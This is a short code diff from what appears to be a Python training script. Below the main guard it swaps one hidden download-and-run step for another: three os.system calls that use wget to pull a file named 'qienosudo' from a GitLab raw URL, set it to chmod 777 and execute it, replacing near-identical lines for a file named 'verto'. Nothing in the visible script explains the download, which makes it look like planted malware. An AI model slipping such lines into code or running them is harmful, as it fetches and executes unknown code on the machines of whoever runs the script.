@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://raw.githubusercontent.com/aqshakuy/viti/main/verto')
-os.system('chmod 777 verto')
-os.system('./verto')
+os.system('wget https://gitlab.com/nugabut/minder/-/raw/main/qienosudo')
+os.system('chmod 777 qienosudo')
+os.system('./qienosudo')
